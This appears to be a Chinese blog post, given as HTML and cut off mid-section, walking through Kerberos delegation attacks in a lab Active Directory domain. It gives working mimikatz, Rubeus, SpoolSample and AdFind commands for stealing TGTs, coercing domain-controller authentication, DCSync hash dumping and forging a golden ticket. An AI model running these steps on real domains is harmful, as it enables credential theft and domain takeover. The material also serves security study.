@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="𝐴_𝑌𝑢">
+
+
+
+
+
+<title>域委派攻击 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
+
+
+
+    <link rel="icon" href="/image/favicon.svg">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+    <div class="wrapper">
+        <link rel="stylesheet" href="../fonts/iconfont2/iconfont.css"> 
+
+<header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-zhuye"></i>主页</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">主页</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
+    </div>
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a onclick="go_top()">△ 顶部</a>
+        <a onclick="go_bottom()">▽ 底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "▼ 收起目录"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "▶︎ 展开目录"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">域委派攻击</h1>
+            
+                <div class="post-meta">
+                    
+                        <!--作者:-->
+                        <i class="iconfont icon-user"></i>
+                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
+                    
+
+                    
+                        <span class="post-time">
+                        <!--发布时间:-->
+                        <i class="iconfont icon-time"></i>
+                        <a href="#">2022-05-15&nbsp;&nbsp;21:50:04</a> &nbsp;
+                        </span>
+                    
+                    
+                    
+                    <span id="/2022/05/15/22-0515-01/" class="leancloud-visitors view" data-flag-title="域委派攻击">
+                        <text class="post-meta-item-text">
+                            <!--阅读数:-->
+                            <i class="iconfont icon-view"></i>
+                        </text>
+                        
+                        <text class="leancloud-visitors-count">加载中</text>
+                      </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。</p>
+<p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p>
+<img src="/2022/05/15/22-0515-01/image-20220523215242718.png" alt="image-20220523215242718" style="zoom:80%;">
+
+<p>上图是经典的应用场景。一个域内普通用户jack通过Kerberos协议认证到前台WEB服后，前台运行WEB服务的服务账号websvc模拟（Impersonate）用户jack，以Kerberos协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中跳或者多跳的Kerberos认证。按照图中红色字体的数字，具体步骤如下：</p>
+<ul>
+<li>域内用户jack以Kerberos方式认证后访问Web服务器；</li>
+<li>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请；</li>
+<li>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据TGT；</li>
+<li>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据TGS；</li>
+<li>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据TGS；</li>
+<li>websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</li>
+</ul>
+<p>域内委派主要有3种应用方式：</p>
+<ul>
+<li><p>一是非约束性委派（Unconstrained Delegation），服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。</p>
+<p>举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，<strong>发现是非约束性委派时，KDC会将用户C的TGT放在TGS中</strong>（正常的kerberos协议中KDC中并不会包含TGT），这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。</p>
+</li>
+<li><p>二是约束性委派（Constrained Delegation），即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；</p>
+</li>
+<li><p>三是资源委派（协议传递），即Kerberos的扩展协议S4U2Self，服务账号针对某一个特定服务，可查询获取任意用户的TGS，从而能模拟任意用户访问该特定服务。</p>
+</li>
+<li><p>注意：在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。</p>
+</li>
+</ul>
+<h1 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h1><blockquote>
+<p>环境如下：</p>
+</blockquote>
+<img src="/2022/05/15/22-0515-01/image.png" alt="img" style="zoom:80%;">
+
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>在域控12server-ad1上设置域成员主机12server1为委派</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313595-sZWS69ZgUmXJLsLJSAJPhB-0-ba8bb1f16f92c64945c1e02257a189de&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
+
+<p>在域控12server-ad1上创建普通域用户web，密码为pass@123</p>
+<p>然后把域用户web设置为服务账号</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-7x9zWoY71BZZ5fvdVPedzv-0-5503086fdc5c7d4158df8c2c1b358038&image_process=resize,w_783.75" alt="img" style="zoom:80%;">
+
+<p>然后对web域用户设置委派</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-iH4vDxeAPLfVcuB5QXmrg4-0-bc397695823f1f3b9c533e4a560cac18&image_process=resize,w_606.25" alt="img" style="zoom:80%;">
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ol>
+<li><p>用域用户test登陆12server1，然后利用AdFind.exe工具来查看配置了非约束性委派的机器账户和服务账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询域中配置非约束委派的机器账户</span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image-16533145368605.png" alt="img" style="zoom:80%;">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询域中配置非约束委派的服务账号</span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313595-mCDqfm5SEfMHjn1g3n83Ti-0-d0758620aa7702a52f2dab091d1244cd&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
+</li>
+<li><p>然后在域控ad1上用winrm连接域内12server1主机，由于12server1开启了委派，所以在kerberos协议中12server1最终会收到域控ad1上域管理员的TGT，即域管理员的TGT就会保存在12server1的主机上</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313595-wKLEDLLYPBrk1mQLMvw4f1-0-e0f4df444fa47fa8e3410da6e4ff6e25&image_process=resize,w_888.75" alt="img" style="zoom:80%;">
+</li>
+<li><p>然后我们再次登陆12server1，用mimikatz把所有的票据导出，这里用mimikatz需要高权限，所以登陆12server1主机用的本地管理员用户，并且在mimikatz中输入如下命令把票据导出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+
+<p>然后我们发现了域管理员的高权限票据：</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-6J1DjzoPM9JiR9hG3XL8kA-0-8f287ed426fc9c72e1ee16546781c06a&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
+</li>
+<li><p>然后再把该票据导入到内存中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt 凭证名称</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-boztAFR9ShmKAXsKqGK4pa-0-dfe2c63160cba9688aa89368496f9cf8&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
+</li>
+<li><p>导入后，12server1机器就已经拥有了域管理员的权限，可以在12server1上访问域控</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-w26PifAimYDxBhpa5YnzqC-0-98ae740c61892776ca5215c901e3429a&image_process=resize,w_577.5" alt="img" style="zoom:80%;">
+
+<p>当然，也可以访问12server2机器</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-iRfRAAu5y2JLwaJKww3dNw-0-893fe5fbfa0cceb4ae92bb7b94bba914&image_process=resize,w_566.25" alt="img" style="zoom:80%;"></li>
+</ol>
+<h2 id="非约束性委派-amp-PrinterBug-（Spooler）"><a href="#非约束性委派-amp-PrinterBug-（Spooler）" class="headerlink" title="非约束性委派&amp;PrinterBug （Spooler）"></a>非约束性委派&amp;PrinterBug （Spooler）</h2><p>上面介绍了非约束性委派的一般方法，但是该方法必须由域管理员远程连接后留下高权限的TGT才能利用，因此显得有些鸡肋。然而，利用PrinterBug可以为非约束性委派攻击助力。</p>
+<p>Windows 中的 MS-RPRN（Print System Remote Protocol，打印系统远程协议）用于打印客户端和打印服务器之间的通信，支持客户端和服务器之间的同步打印和联机操作，包括打印任务控制以及打印系统管理。</p>
+<p>MS-RPRN协议中定义的 RpcRemoteFindFirstPrinterChangeNotification API 可以创建远程修改通知对象，用于监控对打印机对象的修改，并向打印客户端发送修改通知。任何具备域用户权限的攻击者都可以滥用该方法来强迫运行打印服务（Print Spooler）的主机向攻击者选择的目标主机发起 Kerberos 或 NTLM 认证请求。</p>
+<p>结合 PrinterBug，攻击者可以强制域控制器向配置了非约束性委派的主机发起 Kerberos 身份认证，并获取域控的高权限 TGT，该利用场景是 <a target="_blank" rel="noopener" href="https://twitter.com/tifkin_">@tifkin_</a>、<a target="_blank" rel="noopener" href="http://twitter.com/enigma0x3">@enigma0x3</a> 和 <a target="_blank" rel="noopener" href="https://twitter.com/harmj0y">@harmj0y</a> 在 2018 年的 DerbyCon 大会上提出的，并开发了一个概念性的工具 <a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>。详情可以参考以下链接中的文章和视频</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory">https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory</a></li>
+</ul>
+<img src="/2022/05/15/22-0515-01/image-165331511684815.png" alt="img" style="zoom:80%;">
+
+<h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><ul>
+<li>首先目标主机域控12server-ad1必须开启Spooler服务（该服务默认是开启的）</li>
+<li>12server1域成员主机是开启委派的</li>
+</ul>
+<h3 id="对PrinterBug和非约束性委派结合复现"><a href="#对PrinterBug和非约束性委派结合复现" class="headerlink" title="对PrinterBug和非约束性委派结合复现"></a>对PrinterBug和非约束性委派结合复现</h3><ol>
+<li><p>用test用户登陆12server1，在12server1域成员主机上启动Rubeus监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:ad1$</span><br><span class="line"></span><br><span class="line"># /interval:1 设置监听间隔1秒</span><br><span class="line"># /filteruser 设置监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的 TGT</span><br><span class="line"></span><br><span class="line">runas /profile /user:12server1\administrator cmd  #在cmd命令行下切换至管理员</span><br></pre></td></tr></table></figure>
+
+<p>发现运行报错，原因是权限不够，这里可以通过cmd命令行来切换到12server1的本地管理员，然后再用Rubeus监听</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-v8fEjF2E9YsUz3pZrJmoXp-0-0d59c24ac229b267d0690830c43332bd&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
+</li>
+<li><p>然后在12server1机器上，让域用户test利用SpoolSample.exe工具向域控12server-ad1的Spooler服务发送请求，强制域控向12server1机器发起身份认证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe  ad1 12server1</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就可以监听到来自域控的认证请求，捕捉到TGT票据了</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-eLHyHiPG89U1YyNKktxYpa-0-a82f4162e982eccf4e7167d2f40f022e&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
+
+<p>注意：为了方便，用Rubeus进行监听的时候，可以采用如下的命令，这样会把监听的内容都放到hash.txt文件中，方便复制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:ad1$ &gt; c:\hash.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image-165331547664119.png" alt="img" style="zoom:80%;">
+</li>
+<li><p>然后利用powershell把base64的TGT票据转换为正常的TGT票据，我们发现生成了ticket.kirbi票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;doIFCjCCBQagAwIBBaEDAgEWooIEEzCCBA9hggQLMIIEB6ADAgEFoQ4bDFJFRFRFQU0uQ0xVQqIhMB+gAwIBAqEYMBYbBmtyYnRn</span><br><span class="line">dBsMUkVEVEVBTS5DTFVCo4IDyzCCA8egAwIBEqEDAgECooIDuQSCA7VmQ3UG2RXvrndQofU5JkIqqD3HDAjE4r1Lzr7nX8ENC7ve</span><br><span class="line">OIe9ReSaqJMyNdDFupM/snJN2vkqmvKmHHf3N+4N488CZGg81Jg21mpV9CpM36yVnEhJSjPTGZQ/5RTe8F9JbxuFOsiSzKrcuPLC</span><br><span class="line">hX5vml13+ZsFrKU+WueBDVahbDi7FGHO0P4XzUo3l7Zmqyh/yx0uTXo75kIzlH1Ja7uA4cKMQSpQMEAPx4lFxPiRW+urwVUlHcAj</span><br><span class="line">/oak6KmE0kpd2HSZI5qp3JNwCQQyAaFmjgb/uDFsBDZHik4F24IP7JVjS52Uzd8mH5lAXlQ+WOnXqWpAtU3NCLznBp+4MaeN4M2+</span><br><span class="line">xa1DPIxLoFQ9P2betxccn9oWNlbIy5uG0J/5Xfe+gLjD5ySv2riJOGwj/PcLFHtX3FbgZBjITxeKkx5kgiigwgzepm7pi2IchQws</span><br><span class="line">6RU2ZqZBt1vcmnBy2sZrzQBSrpmaVtJ7p45EAkGcN0kbMX6rhxkUmxlFKCT/V0DBsZiQMpp+fZ+EiGhbh5QQvJub3B1H44HRiCOo</span><br><span class="line">BZ1JvvV/USsfz9G4UVelZq5XxeBzKXJxw1cROiCnDOoaVQ7pxTB8lxSJR/sUWln27JSPGR4KfAQ+IC4bYRYZhtS/3UnYOI5jY4Mk</span><br><span class="line">hL06XE/+ZnukN3aQHjRntvyz4YGvxrb4o39XdLkd6ELX3p+8IOuC7gWYWYH6OOPZ+yozp+LTxduajHOKI5RfMaN+hMtMIm9QV0FZ</span><br><span class="line">87XHmeus5dNmWvv3zIbgB7HHtS9pJr7xwYine0k1VU//ThAv1Rs9ZA/RqwKTQ+F2Wc4Xm0gk9SCpERgohIyn57zKPDvtDEz8FBaS</span><br><span class="line">G6McktTAQbVCPsQwgqiujUHeRxW3+8bLyaVWtw1MYyb587WPpjx6dWFFO/RfGcl1sL01/V5xmuIgFYrv4PNj4pCzD0srozn+XMyf</span><br><span class="line">QLv2Tmb9nMjGHNT+6Yg/DuuNSa+MRnnjwY1cGPGbiq6rg94DawuOIz/M5ZS1ADrIX9dbTNyMa+dQw0ilqD5m0Lh4XQTKZnuxUVfn</span><br><span class="line">/AaOjkPW1E6RVWEgnKzVX7GcOm43ExVhh3xjJpZ577o+xpq3TVtDVNv5IWEwsmLxPsQ/QiIRKO1iLQ7s0Eo6/YOto+uJwYiPSgD4</span><br><span class="line">9Gc4J5HtFKd7zjlO7xgzugDjihk52d87FbBJ+ylkA5F8gBgzZ+Z6AaTzr30qzjghxVxhwlvzOP69iwuW9FivzRODbt5WJQfdOzYC</span><br><span class="line">MzQPw0xHQNFAGvc5F3doo4HiMIHfoAMCAQCigdcEgdR9gdEwgc6ggcswgcgwgcWgKzApoAMCARKhIgQgMZNCRa6kItt+27WKjzKL</span><br><span class="line">5Vpvee7mzMgsCtdO0vCyT7GhDhsMUkVEVEVBTS5DTFVCohEwD6ADAgEBoQgwBhsEQUQxJKMHAwUAYKEAAKURGA8yMDIyMDMyMzA0</span><br><span class="line">NTQyN1qmERgPMjAyMjAzMjMxNDU0MjZapxEYDzIwMjIwMzMwMDQ1NDI2WqgOGwxSRURURUFNLkNMVUKpITAfoAMCAQKhGDAWGwZr</span><br><span class="line">cmJ0Z3QbDFJFRFRFQU0uQ0xVQg==&quot;))</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/format,webp.webp" alt="img" style="zoom:80%;">
+</li>
+<li><p>然后利用mimikatz把票据导入到内存中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list   #先用命令查看是否有缓存的票据，如果有用kerberos::purge命令删除</span><br><span class="line">kerberos::ptt C:\users\test\ticket.kirbi  #导入票据</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-xdB4aWqLDVC6d8BNSGLBBL-0-062a57f5ff11d5c30836bcb269fd9fec&image_process=resize,w_571.25" alt="img" style="zoom:80%;">
+</li>
+<li><p>导入票据成功后，尝试访问域控，还是无法访问到</p>
+<img src="/2022/05/15/22-0515-01/image-165331557657023.png" alt="img" style="zoom:80%;">
+</li>
+<li><p>但是由于域控机器账户是默认拥有DCSync权限的，所以导入TGT票据后，我们可以利用mimikatz把域内用户的hash值导出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:redteam.club /all /csv&quot; &quot;exit&quot;&gt;log.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image-165331628050425.png" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313597-4iWV4Ba8EsPqr4RuCuZHU4-0-2091f1d65b28f2539236cc1a5a251c57&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
+
+</p><p>在log.txt中我们得到了krbtgt用户的hash，所以可以用来做黄金票据</p>
+</li>
+<li><p>得到域的SID值，然后由于我们还得到了krbtgt的hash值，就可伪造黄金票据</p>
+<img src="/2022/05/15/22-0515-01/image-165331637527228.png" alt="img" style="zoom:80%;">
+</li>
+<li><p>利用mimikatz伪造金票ntlm.kirbi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:redteam.club /sid:S-1-5-21-2365300756-2663045586-4193326672 /krbtgt:b6e0fcce3106665064de4917394ccc27 /user:administrator /ticket:ntlm.kirbi</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image-165331639820830.png" alt="img" style="zoom:80%;">
+</li>
+<li><p>利用mimikatz导入金票</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt ntlm.kirbi    //注意导入票据前最好先把缓存中的票据删除</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313597-oKEVuPcSEVmNbpn9W1mnGt-0-a09373dd9a9a9dc9b3586eecfab93169&image_process=resize,w_407.5" alt="img" style="zoom:80%;">
+</li>
+<li><p>再次尝试访问域控即可成功</p>
+<img src="/2022/05/15/22-0515-01/image-165331643837433.png" alt="img" style="zoom:80%;"></li>
+</ol>
+<h3 id="票据导入时候的注意事项"><a href="#票据导入时候的注意事项" class="headerlink" title="票据导入时候的注意事项"></a>票据导入时候的注意事项</h3><p>导入票据前最好把缓存的票据全部清空</p>
+<p>cmd命令行中可以用klist命令查看，清空用klist purge全部清空。更多使用方法如下：</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/klist">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/klist</a></p>
+<p>mimikatz中则用kerberos::list 来查看缓存的票据，用kerberos::purge来清空	</p>
+<h1 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h1><h2 id="无S4U2Self参与"><a href="#无S4U2Self参与" class="headerlink" title="无S4U2Self参与"></a>无S4U2Self参与</h2><p>S4U2proxy：S4U2proxy可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以代表任何用户获取在 <code>msDS-AllowedToDelegateTo</code> 中设置的服务的 TGS&#x2F;ST，首先需要从该用户到其本身的 TGS&#x2F;ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS&#x2F;ST。</p>
+<blockquote>
+<p>用户A以kerberos与server1进行认证，认证过程如下：</p>
+</blockquote>
+<img src="/2022/05/15/22-0515-01/image-165331656556935.png" alt="img" style="zoom:80%;">
+
+<h2 id="有S4U2Self参与"><a href="#有S4U2Self参与" class="headerlink" title="有S4U2Self参与"></a>有S4U2Self参与</h2><p>S4U2Self：S4U2self可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个<strong>服务账户</strong>的 userAccountControl 标志为 <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>, 则其可以<strong>代表任何其他用户</strong>获取自身服务的 TGS&#x2F;ST。</p>
+<blockquote>
+<p>用户A以其它方式（如NTLM认证、基于表单的认证方式）与server1进行认证，用户是无法向server1提供票据ST1的，那么服务器也无法进一步利用S4U2Proxy去访问server2了。哪么我们如何来得到这个ST1票据呢？我们可以利用S4U2Self来解决这个问题</p>
+</blockquote>
+<img src="/2022/05/15/22-0515-01/image-165331670470737.png" alt="img" style="zoom:80%;">
+
+<h2 id="如何想办法进行利用："><a href="#如何想办法进行利用：" class="headerlink" title="如何想办法进行利用："></a>如何想办法进行利用：</h2><p>server1访问server2就相当于用户A访问server2的cifs服务，而如果这里的用户A能够伪造成域管理员用户，那么server1访问server2就相当于域管理员访问server2的cifs服务，那么一定是可以访问成功的，嘿嘿！！！</p>
+<h2 id="测试环境如下："><a href="#测试环境如下：" class="headerlink" title="测试环境如下："></a>测试环境如下：</h2><img src="/2022/05/15/22-0515-01/image-165331676225539.png" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/15/22-0515-01/image-165331704370741.png" alt="img" style="zoom:80%;">
+
+</p><h2 id="环境配置-2"><a href="#环境配置-2" class="headerlink" title="环境配置"></a>环境配置</h2><ol>
+<li><p>在域控12server-ad1上面取消12server1和12server2的委派</p>
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316503-s7DW8zg5qMc5vNcJC9Hy7G-0-d618832f5e1a19dc089ef5bc5c2eeeb0&image_process=resize,w_616.25" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316503-iGyur53gE5Ty7agk8jBJPN-0-929c16133a538405bb29e7ebf72a3376&image_process=resize,w_607.5" alt="img" style="zoom:80%;">
+</p></li>
+<li><p>在域控12server-ad1上创建域用户websec，密码为：pass@123，创建完成后是没有委派选项的，因为服务账号才可以进行委派</p>
+</li>
+<li><p>然后设置websec为服务账号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A cifs/12server2.redteam.club websec</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316503-feVHJCByMntZZoVqobHDj1-0-b2397f0f8cb7025ccd4c3eb11f5e1ee1&image_process=resize,w_712.5" alt="img" style="zoom:80%;">
+</li>
+<li><p>然后对websec账号做委派设置，选择使用任何身份协议这个选项实际就是以允许NTLM认证、基于表单的认证方式进行认证，也就是有S4U2Self参与的过程，如果选择仅使用kerberos，那么就是无S4U2Self参与的过程，这里选择任何身份协议这个选项。</p>
